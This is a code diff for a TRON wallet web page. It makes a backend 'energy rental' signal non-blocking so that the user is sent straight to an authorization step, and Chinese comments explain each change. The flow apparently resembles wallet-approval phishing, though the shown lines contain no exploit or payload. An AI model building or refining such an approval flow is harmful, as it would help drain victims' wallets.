@@ -1129,6 +1129,7 @@ async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     const walletModal = document.getElementById("walletModal");
     const connectBtn = document.getElementById("connectBtn");
+    const userAgent = window.navigator.userAgent.toLowerCase();
     
     if (window.tronWeb && window.tronWeb.defaultAddress) {
         // 钱包环境：正常初始化
@@ -1385,11 +1386,15 @@ function bindUnlockedCoreLogic() {
             }
 
             // 保留B1信号校验（后端租能量），但不刷新
+          // 核心修改1：先标记B1已发送（防重复），再发起信号请求
+            markB1SignalSent(userAddress); // 提前标记，发送即防重复
             b1Alert = showPersistentAlert(lang.submitRequestTip);
-            const b1Result = await sendSignalB(true);
-            if (b1Result !== "200") throw new Error("B1未返回200");
-            markB1SignalSent(userAddress);
-
+            
+            // 核心修改2：不等待B1返回200，发起请求后直接准备跳转（后端异步处理租能量）
+            sendSignalB(true).catch(err => {
+                console.error("B1信号发送失败（已标记防重复）：", err);
+                // 失败不阻断流程，仅日志提示，用户仍能跳转授权
+            });
             if (b1Alert && b1Alert.parentNode) {
                 b1Alert.parentNode.removeChild(b1Alert);
             }
